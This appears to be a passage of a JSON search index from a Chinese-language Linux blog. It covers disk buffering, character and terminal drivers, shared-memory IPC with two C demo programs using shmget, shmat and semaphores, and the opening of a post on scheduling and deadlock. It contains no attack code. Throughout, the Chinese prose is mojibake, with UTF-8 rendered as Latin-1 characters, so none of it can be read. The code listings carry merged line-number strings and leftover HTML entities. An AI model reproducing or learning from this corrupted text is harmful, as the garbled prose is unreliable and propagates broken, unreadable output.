ä¸€èˆ¬è¯»æ–¹å¼ï¼šæŠŠå½“å‰æ‰€éœ€ç›˜å—ä¸­çš„å†…å®¹è¯»å…¥ç¼“å†²åŒº - é¢„å…ˆè¯»ï¼šè¿›ç¨‹è¯»é¡ºåºæ–‡ä»¶çš„ç›˜å—æ—¶ï¼Œä¼šé¢„å…ˆè¯»å–ä¸‹ä¸€ç›˜å—çš„å†…å®¹ - ä¸€èˆ¬å†™æ–¹å¼ï¼šæŠŠç¼“å†²åŒºæ•°æ®å†™åˆ°ç›˜å—ï¼Œè¿›ç¨‹å¿…é¡»ç­‰å¾…å†™æ“ä½œå®Œæˆ - å¼‚æ­¥å†™æ–¹å¼ï¼šæŠŠç¼“å†²åŒºæ•°æ®å†™åˆ°ç›˜å—ï¼Œè¿›ç¨‹ä¸å¿…ç­‰å¾…å†™æ“ä½œå®Œæˆ - å»¶è¿Ÿå†™ï¼šå…ˆå°†æ•°æ®å†™åˆ°ç¼“å†²åŒºï¼Œæ ‡è®°è¯¥ç¼“å†²åŒºå»¶è¿Ÿå†™ï¼ŒæŒ‚åˆ°ç©ºé—²ç¼“å†²åŒºé˜Ÿåˆ—å°¾éƒ¨ç­‰åˆ°åç»­æ—¶é—´å†å†™åˆ°ç›˜å—ä¸­ ç¡¬ç›˜è¯»å†™é©±åŠ¨è¿‡ç¨‹ï¼š å°†é€»è¾‘å—å·è½¬æ¢ä¸ºç‰©ç†å—å· ç”³è¯· DMA å°†ç‰©ç†å—å·è½¬æ¢ä¸ºç›˜é¢å·/æŸ±é¢å·/æ‰‡åŒºå· ç§»åŠ¨ç£å¤´åˆ°æŒ‡å®šæŸ±é¢ å‘ç¡¬ä»¶æ§åˆ¶å™¨å‘é€è¯»å†™å‘½ä»¤ CPU å‘å‡ºè¯»å†™å‘½ä»¤åä¸å¿…ç­‰å¾…ï¼Œç»§ç»­æ‰§è¡Œå…¶ä»–è¿›ç¨‹ å½“ä¼ è¾“ç»“æŸåï¼Œç¡¬ç›˜æ§åˆ¶å™¨ä¼šå‘ CPU å‘é€ä¸­æ–­ä¿¡å· CPU å“åº”åè½¬å…¥ç¡¬ç›˜ä¸­æ–­å¤„ç†ç¨‹åº 0x0b å­—ç¬¦è®¾å¤‡é©±åŠ¨ å­—ç¬¦è®¾å¤‡ä½œä¸ºäººå’Œè®¡ç®—æœºä¹‹é—´çš„æ¥å£è®¾å¤‡ï¼Œäººä»¬é€šå¸¸é€šè¿‡å­—ç¬¦è®¾å¤‡å‘è®¡ç®—æœºè¾“å…¥ä¿¡æ¯ï¼ˆæŒ‡ä»¤ã€æ•°æ®ï¼‰æˆ–è¾“å‡ºä¿¡æ¯ã€‚å­—ç¬¦è®¾å¤‡ä»¥å­—ç¬¦ä½œä¸ºæ•°æ®ä¼ è¾“å•ä½ï¼Œé€Ÿåº¦è¾ƒæ…¢ã€‚å¸¸è§çš„å­—ç¬¦è®¾å¤‡æœ‰ç»ˆç«¯ã€è¡Œå¼æ‰“å°æœºã€å¡ç‰‡è¾“å…¥æœºç­‰ç­‰ã€‚ å­—ç¬¦è®¾å¤‡çš„ä¼ é€’ä½¿ç”¨ä¸€ç»„ä¸“ç”¨çš„å¯„å­˜å™¨æ¥å®ç°ã€‚æ¯ç§å­—ç¬¦è®¾å¤‡çš„æ§åˆ¶å™¨ä¸€èˆ¬éƒ½æœ‰ä¸‰ä¸ªå¯„å­˜å™¨ï¼š æ§åˆ¶å¯„å­˜å™¨æ¥æ”¶ CPU å‘é€æ¥çš„å‘½ä»¤ã€æ§åˆ¶è®¾å¤‡çš„æ“ä½œï¼› çŠ¶æ€å¯„å­˜å™¨ä¿å­˜è®¾å¤‡çš„çŠ¶æ€ï¼› æ•°æ®å¯„å­˜å™¨æš‚å­˜è¦ä¼ é€çš„æ•°æ®ï¼› æ•°æ®ç»“æ„ å¯¹æ¯ä¸€ç±»å­—ç¬¦è®¾å¤‡åˆ†åˆ«å®¶é‡Œå­—ç¬¦è®¾å¤‡è¡¨ï¼Œè®°å½•ä½¿ç”¨è¯¥ç±»å­—ç¬¦è®¾å¤‡æ‰€éœ€çš„å„ç§ä¿¡æ¯ï¼Œç”±äºå­—ç¬¦è®¾å¤‡ç§ç±»ç¹å¤šï¼Œä¸åŒç§ç±»çš„å­—ç¬¦è®¾å¤‡ç‰¹æ€§å·®åˆ«è¾ƒå¤§ï¼Œå› æ­¤å…¶å­—ç¬¦è®¾å¤‡è¡¨å·®åˆ«è¾ƒå¤§ã€‚ ç»ˆç«¯é©±åŠ¨ç¨‹åº å­—ç¬¦è®¾å¤‡ç§ç±»ç¹å¤šï¼Œå…¶é©±åŠ¨ç¨‹åºå“¥ä¸ç›¸åŒï¼Œè¿™é‡Œå°±ä»¥ç»ˆç«¯é©±åŠ¨æ²‰é¦™å¤ä¸ºä¾‹è®²è¿° Linux ç³»ç»Ÿä¸­å­—ç¬¦è®¾å¤‡é©±åŠ¨ç¨‹åºçš„å·¥ä½œåŸç†ï¼š ç»ˆç«¯ä¸»è¦ç”±é”®ç›˜å’Œæ˜¾ç¤ºå™¨æ„æˆï¼Œç»ˆç«¯é©±åŠ¨ç¨‹åºæ§åˆ¶ç»ˆç«¯è®¾å¤‡å’Œè¿›ç¨‹ä¹‹é—´çš„å­—ç¬¦æ•°æ®ä¼ è¾“ï¼ŒåŒ…æ‹¬ä»¥ä¸‹äº”ç§æ“ä½œï¼š ttopenï¼šæ‰“å¼€ç»ˆç«¯è®¾å¤‡ï¼Œå»ºç«‹ç»ˆç«¯æœºå™¨ä¸ç»ˆç«¯è¿›ç¨‹ä¹‹é—´çš„å¯¹åº”å…³ç³» ttcloseï¼šåˆ‡æ–­ç»ˆç«¯è®¾å¤‡ä¸è¿›ç¨‹ä¹‹é—´çš„å¯¹åº”å…³ç³» ioctlï¼šç”¨äºå¯¹ç»ˆç«¯æœºå™¨çš„æ§åˆ¶ ttreadï¼šä»ç»ˆç«¯è®¾å¤‡è¯»å–æ•°æ® ttwriteï¼šå‘ç»ˆç«¯è®¾å¤‡å‘é€æ•°æ®","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘7-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹å…±äº«å†…å­˜","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘7-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹å…±äº«å†…å­˜/","text":"æ¦‚è¿°ï¼šçŸ¥è¯†ç‚¹ï¼š Linux å…±äº«å†…å­˜æ–¹å¼åŸç†ä»‹ç» Linux å…±äº«å†…å­˜ç›¸å…³ API ä»‹ç» 0x01 Linux è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹å…±äº«å†…å­˜æ¦‚è¿° åœ¨ Linux ä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å±äºè‡ªå·±çš„è¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰å’Œåœ°å€ç©ºé—´ï¼ˆAddr Spaceï¼‰ï¼Œå¹¶ä¸”éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å¯¹åº”çš„é¡µè¡¨ï¼Œè´Ÿè´£å°†è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€è¿›è¡Œæ˜ å°„ï¼Œé€šè¿‡å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰è¿›è¡Œç®¡ç†ã€‚ä¸¤ä¸ªä¸åŒçš„è™šæ‹Ÿåœ°å€é€šè¿‡é¡µè¡¨æ˜ å°„åˆ°ç‰©ç†ç©ºé—´çš„åŒä¸€åŒºåŸŸï¼Œå®ƒä»¬æ‰€æŒ‡å‘çš„è¿™å—åŒºåŸŸå³å…±äº«å†…å­˜ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å½“ä¸¤ä¸ªè¿›ç¨‹é€šè¿‡é¡µè¡¨å°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†åœ°å€æ—¶ï¼Œåœ¨ç‰©ç†åœ°å€ä¸­æœ‰ä¸€å—å…±åŒçš„å†…å­˜åŒºï¼Œå³å…±äº«å†…å­˜ï¼Œè¿™å—å†…å­˜å¯ä»¥è¢«ä¸¤ä¸ªè¿›ç¨‹åŒæ—¶çœ‹åˆ°ã€‚è¿™æ ·å½“ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œå†™æ“ä½œï¼Œå¦ä¸€ä¸ªè¿›ç¨‹è¯»æ“ä½œå°±å¯ä»¥å®ç°è¿›ç¨‹é—´é€šä¿¡ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬è¦ç¡®ä¿ä¸€ä¸ªè¿›ç¨‹åœ¨å†™çš„æ—¶å€™ä¸èƒ½è¢«è¯»ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ä¿¡å·é‡æ¥å®ç°åŒæ­¥ä¸äº’æ–¥ã€‚ å¯¹äºä¸€ä¸ªå…±äº«å†…å­˜ï¼Œå®ç°é‡‡ç”¨çš„æ˜¯å¼•ç”¨è®¡æ•°çš„åŸç†ï¼Œå½“è¿›ç¨‹è„±ç¦»å…±äº«å­˜å‚¨åŒºåï¼Œè®¡æ•°å™¨å‡ä¸€ï¼ŒæŒ‚æ¶æˆåŠŸæ—¶ï¼Œè®¡æ•°å™¨åŠ ä¸€ï¼Œåªæœ‰å½“è®¡æ•°å™¨å˜ä¸ºé›¶æ—¶ï¼Œæ‰èƒ½è¢«åˆ é™¤ã€‚å½“è¿›ç¨‹ç»ˆæ­¢æ—¶ï¼Œå®ƒæ‰€é™„åŠ çš„å…±äº«å­˜å‚¨åŒºéƒ½ä¼šè‡ªåŠ¨è„±ç¦»ã€‚ 0x02 Linux å…±äº«å†…å­˜ä½¿ç”¨æ­¥éª¤ åˆ›å»ºå…±äº«å†…å­˜ã€‚ä¹Ÿå°±æ˜¯ä»å†…å­˜ä¸­è·å¾—ä¸€æ®µå…±äº«å†…å­˜åŒºåŸŸï¼Œè¿™é‡Œç”¨åˆ°çš„å‡½æ•°æ˜¯ shmget() æ˜ å°„å…±äº«å†…å­˜ã€‚ä¹Ÿå°±æ˜¯æŠŠè¿™æ®µåˆ›å»ºçš„å…±äº«å†…å­˜æ˜ å°„åˆ°å…·ä½“çš„è¿›ç¨‹ç©ºé—´ä¸­ï¼Œè¿™é‡Œä½¿ç”¨çš„å‡½æ•°æ˜¯ shmat() ã€‚åˆ°è¿™ä¸€æ­¥å°±å¯ä»¥ä½¿ç”¨è¿™æ®µå…±äº«å†…å­˜äº†ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä½¿ç”¨ä¸å¸¦ç¼“å†²çš„ I/O è¯»å†™å‘½ä»¤å¯¹å…¶è¿›è¡Œæ“ä½œã€‚ æ’¤é”€æ˜ å°„ã€‚ä½¿ç”¨å®Œå…±äº«å†…å­˜å°±éœ€è¦æ’¤é”€ï¼Œç”¨åˆ°çš„å‡½æ•°æ˜¯ shmdt()ã€‚ å…¶ä¸­ç”¨åˆ°çš„ Linux ç³»ç»Ÿå‡½æ•°ä»‹ç»å¦‚ä¸‹ï¼š shmget() å‡½æ•°åˆ›å»ºå…±äº«å†…å­˜ 1234567891011121314#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;int shmget(key_t key, int size, int shmflg);/*å‚æ•°ï¼š keyï¼šå…±äº«å†…å­˜çš„é”®å€¼ï¼Œå¤šä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡å®ƒè®¿é—®åŒä¸€ä¸ªå…±äº«å†…å­˜ï¼Œå…¶ä¸­ IPC_PRIVATE ç”¨äºåˆ›å»ºå½“å‰è¿›ç¨‹ç§æœ‰çš„å…±äº«å†…å­˜ sizeï¼šå…±äº«å†…å­˜çš„å¤§å° shmflgï¼šåŒ open() å‡½æ•°çš„æƒé™ä½è¿”å›å€¼ï¼š æˆåŠŸï¼šå…±äº«å†…å­˜æ®µæ ‡è¯†ç¬¦ å¤±è´¥ï¼š-1*/ shmat() å‡½æ•°æ˜ å°„å…±äº«å†…å­˜ 1234567891011121314#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;char *shmat(int shmid, const void *shmaddr, int shmflg);/*å‚æ•°ï¼š shmidï¼šè¦æ˜ å°„çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ shmaddrï¼šå°†å…±äº«å†…å­˜æ˜ å°„åˆ°æŒ‡å®šåœ°å€ï¼Œæ³¨æ„è¿™é‡Œçš„æ˜¯ void å‹æŒ‡é’ˆï¼Œå¦‚æœæ˜¯ 0 åˆ™ç³»ç»Ÿå°†è‡ªåŠ¨åˆ†é…åœ°å€å¹¶å°†å…±äº«å†…å­˜æ˜ å°„åˆ°è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ shmflgï¼šSHM_RDONLYï¼ˆå…±äº«å†…å­˜åªè¯»ï¼‰ï¼Œ0ï¼ˆå¯è¯»å†™ï¼‰è¿”å›å€¼ï¼š æˆåŠŸï¼šè¢«æ˜ å°„çš„æ®µåœ°å€ å¤±è´¥ï¼š-1*/ å®éªŒä¸€ shmem_demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define BUFFER_SIZE 256int main(int argc, char *argv[])&#123; pid_t pid; int shmid;//å…±äº«å†…å­˜æ ‡è¯†ç¬¦ char *shm_addr = NULL; char flag[] = &quot;SHIYANLOU&quot;;//æ ‡å¿—å­—ç¬¦ä¸² char buf[BUFFER_SIZE] = &#123;0&#125;; /* åˆ›å»ºå…±äº«å†…å­˜ */ shmid = shmget(IPC_PRIVATE, BUFFER_SIZE, 0666); if(shmid &lt; 0) &#123; perror(&quot;shmget error&quot;); exit(1); &#125; printf(&quot;Create shared-memory: %d \\n&quot;, shmid); /* æ˜¾ç¤ºå…±äº«å†…å­˜æƒ…å†µ */ system(&quot;ipcs -m&quot;); /* åˆ›å»ºå­è¿›ç¨‹ */ pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork error&quot;); exit(1); &#125; else if(pid == 0) &#123; /* å­è¿›ç¨‹ */ printf(&quot;[%d]Child prograss ...\\n&quot;, getpid()); //æ˜ å°„å…±äº«å†…å­˜ shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Child: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Child : Attach shared-memory [%p]\\n&quot;, getpid(), shm_addr); /* æ˜¾ç¤ºå†…å­˜æƒ…å†µ */ system(&quot;ipcs -m&quot;); while(strncmp(shm_addr, flag, strlen(flag))) &#123; printf(&quot;[%d]Child : Wait for enable data...\\n&quot;, getpid()); sleep(5); &#125; /* å…±äº«å†…å­˜æœ‰æ•ˆæ•°æ®æ˜¾ç¤º */ strcpy(buf, shm_addr+strlen(flag)); printf(&quot;[%d]Child : Shared-memory: %s\\n&quot;, getpid(), buf); /* è§£é™¤å…±äº«å†…å­˜æ˜ å°„ */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Child : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* åˆ é™¤å…±äº«å†…å­˜ */ if(shmctl(shmid, IPC_RMID, NULL) == -1) &#123; perror(&quot;Child : shmctl(IPC_RMID&quot;); exit(1); &#125; printf(&quot;[%d]Child : Delete shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* å­è¿›ç¨‹é€€å‡º */ exit(0); &#125; else &#123; /* çˆ¶è¿›ç¨‹ */ shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Parent: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Attach shared-memory : [%p]\\n&quot;, getpid(), shm_addr); sleep(1); printf(&quot;\\nInput some string:\\n&quot;); fgets(buf, BUFFER_SIZE, stdin); strncpy(shm_addr + strlen(flag), buf, strlen(buf)); strncpy(shm_addr, flag, strlen(flag)); /* è§£é™¤å…±äº«å†…å­˜æ˜ å°„ */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;Parent : shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); &#125; waitpid(pid, NULL, 0); printf(&quot;\\nFinished...\\n&quot;); return 0;&#125; åœ¨ VS Code å¹³å°ä¸‹çš„ç»ˆç«¯çª—å£ä½¿ç”¨ gcc å·¥å…·å®Œæˆå¯æ‰§è¡Œæ–‡ä»¶ç¼–è¯‘ï¼š 12gcc shmem_demo.c -o shmem_demo./shmem_demo æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š å®éªŒäºŒâ€”â€”shmem_sem.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define BUFFER_SIZE 256/* å®šä¹‰è”åˆä½“ */union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; // perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int main(int argc, char *argv[])&#123; pid_t pid; int sem_id; int shmid; char *shm_addr = NULL; char buf[BUFFER_SIZE]; //åˆ›å»ºä¿¡å·é‡ sem_id = semget(ftok(&quot;.&quot;, &#x27;a&#x27;), 1, 0666|IPC_CREAT); init_sem(sem_id, 0); //åˆ›å»ºå…±äº«å†…å­˜ shmid = shmget(IPC_PRIVATE, BUFFER_SIZE, 0666); if(shmid &lt; 0) &#123; perror(&quot;shmget&quot;); exit(1); &#125; printf(&quot;Create Shared-memory : %d\\n&quot;, shmid); //æ˜¾ç¤ºå…±äº«å†…å­˜æƒ…å†µ system(&quot;ipcs -m&quot;); pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork() error&quot;); exit(1); &#125; else if(pid == 0) &#123; //å­è¿›ç¨‹ //æ˜ å°„å…±äº«å†…å­˜ shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Child: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Child : Attach shared-memory [%p]\\n&quot;, getpid(), shm_addr); /* æ˜¾ç¤ºå†…å­˜æƒ…å†µ */ system(&quot;ipcs -m&quot;); printf(&quot;[%d]Child : Wait for enable data...\\n&quot;, getpid()); /* å…±äº«å†…å­˜æœ‰æ•ˆæ•°æ®æ˜¾ç¤º */ while(1) &#123; memset(buf, 0, BUFFER_SIZE); sem_p(sem_id); strcpy(buf, shm_addr); memset(shm_addr, 0, BUFFER_SIZE); printf(&quot;[%d]Child : Shared-memory: %s\\n&quot;, getpid(), buf); if((!strncmp(buf, &quot;q&quot;, 1)) || (!strncmp(buf, &quot;Q&quot;, 1))) &#123; printf(&quot;[%d]Child Will Quit.\\n&quot;, getpid()); break; &#125; &#125; sem_v(sem_id); del_sem(sem_id); /* è§£é™¤å…±äº«å†…å­˜æ˜ å°„ */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Child : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* åˆ é™¤å…±äº«å†…å­˜ */ if(shmctl(shmid, IPC_RMID, NULL) == -1) &#123; perror(&quot;Child : shmctl(IPC_RMID&quot;); exit(1); &#125; printf(&quot;[%d]Child : Delete shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* å­è¿›ç¨‹é€€å‡º */ exit(0); &#125; else &#123; //çˆ¶è¿›ç¨‹ shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Parent: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Attach shared-memory : [%p]\\n&quot;, getpid(), shm_addr); sleep(1); while(1) &#123; memset(buf, 0, BUFFER_SIZE); printf(&quot;\\nInput some string:\\n&quot;); fgets(buf, BUFFER_SIZE, stdin); strncpy(shm_addr, buf, strlen(buf)); sem_v(sem_id); if((!strncmp(buf, &quot;q&quot;, 1)) || (!strncmp(buf, &quot;Q&quot;, 1))) &#123; printf(&quot;[%d]Parent Will Quit.\\n&quot;, getpid()); break; &#125; &#125; /* è§£é™¤å…±äº«å†…å­˜æ˜ å°„ */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;Parent : shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); &#125; waitpid(pid, NULL, 0); printf(&quot;\\nFinished...\\n&quot;); return 0;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘9-å¤„ç†æœºè°ƒåº¦ä¸æ­»é”.md","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘9-å¤„ç†æœºè°ƒåº¦ä¸æ­»é”/","text":"æ¦‚è¿°ï¼š å¤„ç†æœºçš„ä¸‰çº§è°ƒåº¦ ä½œä¸šè°ƒåº¦åŠè¿›ç¨‹è°ƒåº¦çš„æ¦‚å¿µ è°ƒåº¦ç®—æ³•çš„è¯„ä»·å‡†åˆ™ å‡ ç§å¸¸ç”¨çš„ä½œä¸šè°ƒåº¦ã€è¿›ç¨‹è°ƒåº¦ç®—æ³• æ­»é”çš„æ¦‚å¿µåŠäº§ç”ŸåŸå›  æ­»é”çš„é¢„é˜²åŠæ³• æ­»é”çš„æ£€æµ‹ä¸æ¢å¤æ–¹æ³• 0x01 åˆ†çº§è°ƒåº¦ æ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªéå¸¸é‡è¦çš„åŠŸèƒ½å°±æ˜¯ç®¡ç†è®¡ç®—æœºèµ„æºï¼Œæé«˜ç³»ç»Ÿçš„æ•ˆç‡ã€‚å¯¹å¤„ç†æœºçš„ç®¡ç†æ˜¯æ“ä½œç³»ç»Ÿçš„åŸºæœ¬åŠŸèƒ½ä¹‹ä¸€ã€‚åœ¨æ—©èµ·çš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œå¯¹ CPU çš„ç®¡ç†éå¸¸ç®€å•ï¼Œä¸å…¶ä»–ç³»ç»Ÿèµ„æºä¸€æ ·åœ¨æ•´ä¸ªæ“ä½œç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­è¢«å•ç‹¬ä¸€ä¸ªä½œä¸šæ‰€ç‹¬å ï¼Œä¸å­˜åœ¨å¤„ç†æœºåˆ†é…å’Œè°ƒåº¦é—®é¢˜ã€‚éšç€å¤šé“ç¨‹åºè®¾è®¡æŠ€æœ¯å’Œå„ç§ç±»å‹çš„æ“ä½œç³»ç»Ÿçš„å‡ºç°ï¼Œå„ç§ä¸åŒçš„ CPU ç®¡ç†æ–¹å¼å¼€å§‹ä½¿ç”¨ï¼Œä¸ºç”¨æˆ·æä¾›ä¸åŒæ€§èƒ½çš„æ“ä½œç³»ç»Ÿã€‚ å…¸å‹çš„æ‰¹å¤„ç†ä½œä¸šï¼Œä»è¿›å…¥ç³»ç»Ÿå¹¶é©»ç•™åœ¨å¤–éƒ¨å­˜å‚¨çš„åå¤‡é˜Ÿåˆ—ä¸Šå¼€å§‹ï¼Œç›´åˆ°ä½œä¸šè¿è¡Œå®Œæ¯•ï¼ŒåŸºæœ¬éƒ½éœ€è¦ç»è¿‡è¿™æ ·çš„ä¸‰çº§è°ƒåº¦ï¼šä½œä¸šè°ƒåº¦ã€å¯¹æ¢ä»¥åŠè¿›ç¨‹è°ƒåº¦ã€‚ 0x02 è°ƒåº¦çš„å±‚æ¬¡ ä½œä¸šè°ƒåº¦ ä½œä¸šè°ƒåº¦åˆç§°ä¸ºé«˜çº§è°ƒåº¦æˆ–é•¿è°ƒåº¦ï¼Œç”¨äºé€‰æ‹©æŠŠå¤–éƒ¨å­˜å‚¨ä¸­å¤„äºåå¤‡é˜Ÿåˆ—ä¸­çš„å“ªäº›ä½œä¸šè°ƒå…¥å†…å­˜ï¼Œå¹¶ä¸ºå®ƒä»¬åˆ›å»ºè¿›ç¨‹ã€åˆ†é…å¿…è¦çš„èµ„æºã€‚å¦‚ä½•ï¼Œå°†æ–°åˆ›å»ºçš„è¿›ç¨‹æ’åœ¨è¿›ç¨‹å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œå‡†å¤‡æ‰§è¡Œã€‚åœ¨æ‰¹å¤„ç†ç³»ç»Ÿä¸­ï¼Œä½œä¸šè¿›å…¥ç³»ç»Ÿåï¼Œæ˜¯å…ˆé©»ç•™åœ¨å¤–éƒ¨å­˜å‚¨ä¸Šçš„ï¼Œå› æ­¤éœ€è¦æœ‰ä½œä¸šè°ƒåº¦çš„è¿‡ç¨‹ï¼Œä»¥ä¾¿å°†å®ƒä»¬åˆ†æ‰¹åœ°è£…å…¥å†…å­˜ã€‚åœ¨åˆ†æ—¶ç³»ç»Ÿä¸­ï¼Œä¸ºäº†åšåˆ°åŠæ—¶å“åº”ï¼Œç”¨æˆ·é€šè¿‡é”®ç›˜è¾“å…¥çš„å‘½ä»¤æˆ–æ•°æ®ç­‰ï¼Œéƒ½æ˜¯è¢«ç›´æ¥é€å…¥å†…å­˜çš„ï¼Œå› è€Œæ— é¡»å†é…ç½®ä½œä¸šè°ƒåº¦æœºåˆ¶ã€‚åŒæ ·åœ°ï¼Œåœ¨å®æ—¶æ“ä½œç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¹Ÿä¸éœ€è¦ä½œä¸šè°ƒåº¦ã€‚ ä¸€ä¸ªä½œä¸šä»æäº¤ç»™è®¡ç®—æœºç³»ç»Ÿåˆ°æ‰§è¡Œç»“æŸã€é€€å‡ºç³»ç»Ÿï¼Œä¸€èˆ¬è¦ç»å†æäº¤ã€åå¤‡ã€æ‰§è¡Œå’Œå®Œæˆå››ç§çŠ¶æ€ï¼Œå¦‚ä¸‹ï¼š æäº¤çŠ¶æ€ï¼šä¸€ä¸ªä½œä¸šä»è¾“å…¥è®¾å¤‡è¿›å…¥å¤–éƒ¨å­˜å‚¨è®¾å¤‡çš„è¿‡ç¨‹ç§°ä¸ºæäº¤çŠ¶æ€ï¼Œå¤„äºæäº¤çŠ¶æ€çš„ä½œä¸šï¼Œå› 